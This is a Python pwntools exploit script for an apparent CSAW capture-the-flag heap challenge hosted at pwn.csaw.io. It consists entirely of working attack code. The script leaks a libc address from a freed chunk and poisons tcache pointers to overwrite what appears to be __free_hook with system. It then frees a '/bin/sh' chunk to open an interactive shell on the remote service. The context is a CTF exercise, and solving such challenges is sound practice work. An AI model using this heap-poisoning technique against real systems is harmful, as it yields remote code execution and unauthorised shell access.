from pwn import *
# context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./pwn')
p = remote("pwn.csaw.io",9998)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def cmd(c):
    sla(b">\n",str(c).encode())
def add_c(size):
    cmd(2)
    cmd(1)
    sla(b":\n",str(size).encode())
def edit_c(idx,size,c):
    cmd(2)
    cmd(3)
    sla(b":\n",str(idx).encode())
    sla(b":\n",str(idx).encode())
    # sa(b":\n",b"")
    sla(b":\n",str(size).encode())
    sa(b":\n",c)
def free_c(idx):
    cmd(2)
    cmd(2)
    sla(b":\n",str(idx).encode())
def show_c(idx):
    cmd(2)
    cmd(4)
    sla(b":\n",str(idx).encode())
def add_k(size):
    cmd(1)
    cmd(1)
    sla(b":\n",str(size).encode())
def edit_k(idx,size,c):
    cmd(1)
    cmd(3)
    sla(b":\n",str(idx).encode())
    sla(b":\n",str(size).encode())
    sa(b":\n",c)
def free_k(idx):
    cmd(1)
    cmd(2)
    sla(b":\n",str(idx).encode())
add_c(0x418)# 0
add_c(0x88)# 1
add_c(0x88)# 2
add_k(0x88)# 3
free_c(0)
add_k(0x88)
show_c(0)
ru(b": \n")
base = u64(p.read(6)+b'\0\0') - (0x7ffff7fb1fd0-0x7ffff7dc5000)
info(hex(base))
free_c(2)
free_c(0)
edit_k(1,0x87,p64(0x1eee48+base))
add_c(0x88)
add_k(0x88)
edit_k(2,0x87,p64(0x52290+base))
edit_k(1,0x9,b'/bin/sh\0')
# gdb.attach(p,' bof 0x19f1')
free_c(0)
p.interactive()